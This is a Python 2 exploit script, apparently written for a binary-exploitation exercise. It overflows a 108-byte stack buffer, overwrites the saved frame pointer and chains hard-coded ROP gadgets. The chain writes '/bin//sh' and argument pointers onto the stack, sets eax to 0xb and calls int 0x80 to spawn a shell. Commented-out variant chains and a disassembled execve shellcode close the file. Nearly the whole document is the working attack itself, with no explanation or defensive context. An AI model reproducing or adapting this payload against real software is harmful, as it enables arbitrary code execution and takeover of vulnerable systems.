'''from struct import pack

INT80 = pack("<I",0x08057b00) #int 0x80;
INCEAX = pack("<I",0x08070cc3) #inc %eax; pop %edi;
POPEDI = pack("<I",0x080554d3) #pop %edi
XOREAX = pack("<I",0x08052e81) #xor %eax,%eax
SUBEDX = pack("<I",0x08052e98) #
POPDX = pack("<I",0x08057380)#pop %edx; pop %ecx; pop %ebx
POPDI1 = pack("<I",0x08049788) #pop %esi; pop %edi; pop %ebp
POPDI2 = pack("<I",0x080496df) #pop %ebx; pop %esi; pop %edi
POPEAX = pack("<I",0x0809aeba) #pop %eax; pop %ebx; pop %esi; pop %edi
ADDESP1 = pack("<I",0x08049a8a) #add $0x1c,%esp
NOP = pack("<I",0x42424242)
STACK = pack("<I",0xbffebf08)
SEBP = "\x28\xbf\xfe\xbf" #saved ebp
AX2CX = pack("<I",0x0806f46a)#mov %eax,(%ecx)'''
#gadget list
INT80 = "\x53\x74\x05\x08" #"\x19\x95\x04\x08"#"\x00\x7b\x05\x08"#pack("<I",0x8057b00) #int 0x80;
INCEAX = "\xc3\x0c\x07\x08"#pack("<I",0x8070cc3) #inc %eax; pop %edi;
POPEDI = "\xd3\x54\x05\x08"#pack("<I",0x80554d3) #pop %edi
XOREAX = "\x81\x2e\x05\x08"#pack("<I",0x8052e81) #xor %eax,%eax
SUBEDX = "\x98\x2e\x05\x08"#pack("<I",0x8052e98) #
POPDX = "\x80\x73\x05\x08"#pack("<I",0x8057380)#pop %edx; pop %ecx; pop %ebx
POPDI1 = "\x88\x97\x04\x08"#pack("<I",0x8049788) #pop %esi; pop %edi; pop %ebp
POPDI2 = "\xe0\x96\x04\x08"#pack("<I",0x80496df) pop %esi; pop %edi
POPEAX = "\xba\xae\x09\x08"#pack("<I",0x809aeba) #pop %eax; pop %ebx; pop %esi; pop %edi
ADDESP1 = "\x8a\x9a\x04\x08"#pack("<I",0x8049a8a) #add $0x1c,%esp
NOP = "\x90\x90\x90\x90"#pack("<I",0x42424242)
STACK = "\x10\xbf\xfe\xbf"#pack("<I",0xbffebf08)
SEBP = "\x28\xbf\xfe\xbf" #saved ebp
AX2CX = "\x6a\xf4\x06\x08"#pack("<I",0x806f46a)#mov %eax,(%ecx)
DX2AX = "\xac\x50\x05\x08" #mov %edx,%eax
LEDX = "\xb5\x1e\x0c\x08" #mov(edx)edx;pop ebx;%edx,0x4c(%esi);pop%esi;pop%edi

#code begin
code = "Z"*108 #overflow buffer 0x6c
code += SEBP #save ebp


#xor %eax, push %eax,stack+8
code += XOREAX
code += POPDX
code += NOP 
code += "\x18\xbf\xfe\xbf" 
code += NOP
code += AX2CX #push %eax on stack

#overwrite edx stack
code += POPDX
code += NOP
code += "\x9c\xbf\xfe\xbf"
code += NOP
code += AX2CX #push "//sh" onto stack

#push 0x68732f2f, stack+4
code += POPDX
code += "\x2f\x2f\x73\x68" #edx = "//sh"
code += "\x14\xbf\xfe\xbf"
code += NOP
code += DX2AX #eax = "//sh"
code += AX2CX #push "//sh" onto stack

#push 0x6e69622f stack + 0
code += POPDX
code += "\x2f\x62\x69\x6e" #edx = "/bin"
code += STACK 
code += NOP
code += DX2AX #eax = edx = "/bin"
code += AX2CX #push "/bin" on stack

#mov esp,ebx; push %eax(=0); stack - 4
code += XOREAX
code += POPDX
code += NOP
code += "\x0c\xbf\xfe\xbf"#stack - 4
code += "\x0c\xbf\xfe\xbf"
code += AX2CX

#push ebx; stack - 8;
code += POPDX
code += "\x0c\xbf\xfe\xbf"
code += "\x08\xbf\xfe\xbf" 
code += "\x0c\xbf\xfe\xbf"
code += DX2AX
code += AX2CX

#mov %esp,%ecx,stack-12
code += POPDX
code += "\x0c\xbf\xfe\xbf"
code += "\x08\xbf\xfe\xbf" 
code += "\x10\xbf\xfe\xbf"

#mov %0xb,eax
code += XOREAX
code += (INCEAX+NOP) * 11 #now eax = 0xb

'''
#make edx = 0
code += POPDI2
#pop %esi; pop %edi
code += "\x0c\xbf\xfe\xbf"
code += NOP

code += LEDX
code += "\x0c\xbf\xfe\xbf"
code += NOP
code += NOP
'''
'''
# stack + 4
code += POPDX
code += "\x2f\x2f\x73\x68" #edx = "//sh"
code += "\x14\xbf\xfe\xbf"
code += NOP
code += DX2AX #eax = "//sh"
code += AX2CX #push "//sh" onto stack

#stack - 8
code += POPDX
code += "\x0c\xbf\xfe\xbf"
code += "\x08\xbf\xfe\xbf" 
code += NOP
code += DX2AX
code += AX2CX

#stack + 8
code += POPDX
code += NOP
code += "\x18\xbf\xfe\xbf"
code += NOP
code += XOREAX #eax = 0
code += AX2CX #push 0 onto stack

#stack - 4
code += POPDX
code += NOP
code += "\x0c\xbf\xfe\xbf"#stack - 4
code += NOP
code += AX2CX
'''




'''#ebx = stack-4 ecx = stack-12 edx=stack+8
code += POPDX
code += "\x18\xbf\xfe\xbf" #edx env[]
code += "\x04\xbf\xfe\xbf" #ecx arg[]
code += "\x0c\xbf\xfe\xbf" #ebx file name: /bin//sh'''

#set edx to 0
#mov(edx)edx;pop ebx;%edx,0x4c(%esi);pop%esi;pop%edi



#ebx = stack-4 ecx = stack-12 edx=stack+8
'''code += POPDX
code += "\x18\xbf\xfe\xbf" #edx env[]
code += "\x04\xbf\xfe\xbf" #ecx arg[]
code += "\x0c\xbf\xfe\xbf" #ebx file name: /bin//sh'''

code += INT80


print code
#print pack("<I",0x6e69622f)+pack("<I",0x68732f2f)+"\x00" #/bin//sh
'''
shellcode
0xbffeb709:	6a 0b	push   $0xb
   0xbffeb70b:	58	pop    %eax
   0xbffeb70c:	99	cltd   
   0xbffeb70d:	52	push   %edx
   0xbffeb70e:	68 2f 2f 73 68	push   $0x68732f2f
   0xbffeb713:	68 2f 62 69 6e	push   $0x6e69622f
   0xbffeb718:	89 e3	mov    %esp,%ebx
   0xbffeb71a:	52	push   %edx
   0xbffeb71b:	53	push   %ebx
   0xbffeb71c:	89 e1	mov    %esp,%ecx
   0xbffeb71e:	cd 80	int    $0x80



'''

